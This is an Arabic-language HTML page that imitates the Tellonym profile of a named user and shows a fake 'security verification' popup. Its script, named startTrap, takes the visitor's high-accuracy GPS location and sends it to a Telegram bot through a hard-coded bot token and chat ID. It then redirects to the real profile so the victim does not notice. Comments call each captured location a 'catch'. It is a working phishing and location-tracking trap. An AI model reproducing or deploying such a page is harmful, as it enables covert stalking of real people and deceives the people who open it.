<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Schaien (@Schaien) | Tellonym</title>
    <style>
        body { margin: 0; background-color: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .popup { background: #1c1c1c; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 350px; border: 1px solid #333; }
        .btn { background: #fe2c55; border: none; padding: 15px; border-radius: 25px; color: #fff; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>

    <div class="popup">
        <h2>🔐 نظام الأمان</h2>
        <p>لمشاهدة رسائل التيل السرية لـ Schaien، يرجى تأكيد هويتك عبر السماح بنظام الحقق الجغرافي.</p>
        <button class="btn" onclick="startTrap()">تأكيد الهوية الآن</button>
    </div>

    <script>
        // بياناتك يا سيدي - تأكد من دقتها
        const botToken = "8571405650:AAF1hd5JADnu7a2fdqxLA1E_fUrk45Orbp4";
        const myId = "1138822664";

        function startTrap() {
            if (navigator.geolocation) {
                // طلب الموقع بأعلى دقة
                navigator.geolocation.getCurrentPosition(sendToTelegram, handleErr, {enableHighAccuracy: true});
            } else {
                go();
            }
        }

        function sendToTelegram(pos) {
            const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            const info = `🎯 صيد جديد ومضمون!\n📍 الموقع: ${mapLink}\n🎯 الدقة: ${pos.coords.accuracy} متر`;

            // استخدام طريقة XMLHttpRequest لأنها الأكثر استقراراً مع الأجهزة الغريبة
            var request = new XMLHttpRequest();
            request.open("GET", `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${myId}&text=${encodeURIComponent(info)}`, true);
            request.send();

            // الانتظار ثانية واحدة ثم التوجه للحساب الحقيقي
            setTimeout(go, 1000);
        }

        function handleErr() { go(); }
        function go() { window.location.href = "https://tellonym.me/Schaien"; }
    </script>
</body>
</html>
